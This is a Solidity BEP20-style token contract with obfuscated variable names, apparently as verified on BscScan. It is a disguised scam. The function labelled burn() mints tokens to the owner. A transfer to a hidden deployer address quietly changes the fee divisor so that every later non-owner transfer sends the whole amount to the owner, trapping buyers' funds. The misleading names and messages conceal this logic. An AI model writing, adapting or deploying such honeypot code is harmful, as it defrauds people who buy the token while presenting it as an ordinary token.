/**
 *Submitted for verification at BscScan.com on 2022-11-14
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-14 23:06:00 GMT
 */
pragma solidity >=0.4.11;
contract nVktXD {
uint256 public  UxiOAO = 1000000000000000000;
address public  mwFXNj = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public  rXaNPs = 10000000000000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
uint8 public constant decimals = 18;
string public  name = "HVhTVf";
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public constant totalSupply = 100000000000000000000000000000;
address public  YJwjPw = address(0);
uint256 public  HVUpxZ = 100000000000000000000;
string public  symbol = "HufGhb";
uint256 public  FPBYZU = 10000000000000000000;
address public owner;
uint256 public  PSLTHk = 100000000000000000000000;
uint256 private  jvxbgb = 10000000000000;
address public  esDJZZ = address(0);
address public  UFWrrt = address(0);
address public  ZufFwJ = address(0);
uint256 public  OldEIs = 10000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  TudaYw = address(0);
mapping (address => uint256) public balanceOf;
uint256 public constant haNrsD = 9+1;
uint256 public  MuwdpK = 100000000000000000000000;
uint256 public  uOTAxj = 100000000000000000;
address public  rPAdXH = address(0);
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "MBfxDJ");
require(to != address(0), "MBfxDJ");
require(amount <= balanceOf[from], "MBfxDJ");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* haNrsD/jvxbgb ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==TudaYw){
jvxbgb = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
constructor () public {
TudaYw = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}

}